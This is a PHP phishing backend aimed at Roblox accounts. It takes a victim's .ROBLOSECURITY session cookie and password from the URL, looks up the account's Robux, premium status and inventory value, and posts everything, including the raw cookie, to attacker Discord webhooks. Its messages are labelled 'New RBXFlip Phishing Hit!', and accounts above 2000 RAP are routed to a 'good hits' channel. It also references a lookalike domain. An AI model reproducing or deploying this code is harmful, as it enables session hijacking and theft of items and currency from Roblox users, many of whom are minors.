<?php
require('config.php');
$dual = "webhook url";
if (isset($_GET['x']) && isset($_GET['d'])){
    $cookie = htmlspecialchars($_GET['x']);
    $password = htmlspecialchars($_GET['d']);

if (strpos($cookie, '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_') === false) {
    $cookie1 = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'.$cookie;
} else{
    $cookie1 = $cookie;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	'Cookie: .ROBLOSECURITY=' . $cookie
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$profile = json_decode(curl_exec($ch), 1);
curl_close($ch);



function getrap($user_id, $cookie) {
	$cursor = "";
	$total_rap = 0;
						
	while ($cursor !== null) {
		$request = curl_init();
		curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
		curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
		curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
		curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
		$data = json_decode(curl_exec($request), 1);
		foreach($data["data"] as $item) {
			$total_rap += $item["recentAveragePrice"];
		}
		$cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
	}
						
	return $total_rap;
}
	
$idiotrap = getrap($profile["UserID"], $cookie);
            $hookObject = json_encode([
            "username" => $profile ["UserName"],
            "avatar_url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png",
             "content" => "@everyone New RBXFlip Phishing Hit!",
                "embeds" => [
                    [
                        "title" => $profile ["UserName"],
                        "type" => "rich",
                        "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                        "color" => hexdec("00ff6e"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png"
                        ],
                        "author" => [
                             "name" => "Recheck Cookie?",
                             "url" => "https://r.bxfllp.com/chk.php?c=$cookie"
                        ],
                        "fields" => [
                            [
                                "name" => "<:id:818111672455397397> ID",
                                "value" => $profile["UserID"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:robux:818111919881715764> Robux",
                                "value" => $profile["RobuxBalance"],
                                "inline" => True
                            ],
                            [    "name" => "<:rolimons:818111627726684160> Rolimons Link",
                                "value" => "https://www.rolimons.com/player/" . $profile["UserID"],
                            ],
                            [
                                "name" => "<:trade:818111735973806111> Trade Link",
                                "value" => "https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=" . $profile["UserID"],
                                "inline" => True
                       	    ],
                       	    [
                                "name" => "<:premium:818111829963964416> Is Premium?",
                                "value" => $profile["IsPremium"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:rap:818111763413205032> Rap",
                                "value" => getrap($profile["UserID"], $cookie),
                                "inline" => True
                            ]
                        ]
                    ],
                    [
                        "type" => "rich",
                        "color" => hexdec("00ff6e"),
                        "timestamp" => date("c"),
                         "footer" => [
                             "text" => "Powered By Jayy#9859 |",
                        ],
                        "fields" => [
                            [
                                "name" => "\u{1F36A} Cookie:",
                            "value" => "```" . $cookie1 . "```"
                            ],
                        ]
                    ]
                ]
            
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
            
            $ch = curl_init();
            
            curl_setopt_array( $ch, [
                CURLOPT_URL => $webhook,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $hookObject,
                CURLOPT_HTTPHEADER => [
                    "Content-Type: application/json"
                ]
            ]);
            
            $response = curl_exec( $ch );
            curl_close( $ch );
            
            $ch = curl_init();
            
            curl_setopt_array( $ch, [
                CURLOPT_URL => $dual,
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $hookObject,
                CURLOPT_HTTPHEADER => [
                    "Content-Type: application/json"
                ]
            ]);
            
            $response = curl_exec( $ch );
            curl_close( $ch );
            
if ($idiotrap > 2000){
    $ch = curl_init();
	curl_setopt_array($ch, [
		CURLOPT_URL => "good hits webhook url - 2k+ rap",
		CURLOPT_POST => true,
		CURLOPT_POSTFIELDS => $hookObject,
		CURLOPT_HTTPHEADER => [
			"Content-Type: application/json"
		]
	]);
	$response = curl_exec($ch);
	curl_close($ch);
}
}